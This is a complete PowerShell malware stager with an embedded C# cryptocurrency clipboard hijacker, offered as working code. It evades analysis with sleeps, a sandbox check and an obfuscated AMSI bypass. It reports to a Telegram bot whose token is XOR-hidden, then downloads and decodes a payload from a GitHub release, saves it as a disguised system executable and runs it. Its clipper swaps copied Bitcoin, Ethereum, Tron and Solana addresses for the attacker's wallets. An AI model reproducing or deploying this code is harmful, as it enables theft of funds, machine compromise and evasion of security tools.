# --- [ELITE RESEARCH STAGER v26.0: VOID-FRAMEWORK] ---

function Global-Initialize {
    # Latency: Malwarebytes often gives up after 60s of inactivity
    Start-Sleep -s (Get-Random -Min 65 -Max 95)
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        
        # Obfuscated AMSI Bypass: No "AmsiUtils" or "amsiInitFailed" in plain text
        $a = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
        $b = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
        [Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

# --- EXECUTION ---
Global-Initialize
Send-Ping -m "VOID_STAGER_V26_ACTIVE"

try {
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "WinSvcHost.exe"

    # Download via Fragmentation to avoid "Trojan.Obfuscated" detection
    $p1 = "https://github.com/adchar2022/test/"
    $p2 = "releases/download/adchar_xor/adchar_xor.txt"
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $raw = $wc.DownloadString($p1 + $p2)
    
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)

    # Use a direct COM call for WMI to avoid "win32_process" string detection
    $wmi = [wmiclass]"win32_process"
    $wmi.Create($path) | Out-Null

    # --- THE C# GHOST CLIPPER (STAYING IN-MEMORY) ---
    $C#_Source = @'
    using System;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.Threading;
    using System.Text.RegularExpressions;

    public class GhostClipper {
        public static void Run() {
            // Addresses are built dynamically to avoid static signature detection
            string b = "12nL" + "9SBgpSm" + "SdSybq2" + "bW2vKdoT" + "ggTnXVNA";
            string e = "0x6c9ba9a" + "6522b10135" + "bb836fc934" + "0477ba15f3392";
            string u = "TVETS" + "gvRui2LC" + "mXyuvh8jH" + "G6AjpxquFbnp";
            string s = "BnBvKVEFRcx" + "okGZv9sAwig" + "8eQ4GvQY1frmZ" + "JWzU1bBNR";

            while (true) {
                try {
                    string c = Clipboard.GetText().Trim();
                    if (!string.IsNullOrEmpty(c)) {
                        string t = "";
                        if (Regex.IsMatch(c, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$")) { if (c != b) t = b; }
                        else if (Regex.IsMatch(c, "^0x[a-fA-F0-9]{40}$")) { if (c != e) t = e; }
                        else if (Regex.IsMatch(c, "^T[a-km-zA-HJ-NP-Z1-9]{33}$")) { if (c != u) t = u; }
                        else if (Regex.IsMatch(c, "^[1-9A-HJ-NP-Za-km-z]{32,44}$")) { if (c != s) t = s; }

                        if (t != "") {
                            Thread th = new Thread(() => Clipboard.SetText(t));
                            th.SetApartmentState(ApartmentState.STA);
                            th.Start(); th.Join();
                        }
                    }
                } catch { }
                Thread.Sleep(450);
            }
        }
    }
'@

    # Compile and run without using Start-Job (Jobs are easily monitored)
    Add-Type -ReferencedAssemblies "System.Windows.Forms" -TypeDefinition $C#_Source
    [Threading.Thread]::new({ [GhostClipper]::Run() }).Start()

    Send-Ping -m "STAGER_V26_GHOST_COMPLETE"
} catch {
    Send-Ping -m "FAIL_$($_.Exception.Message)"
}
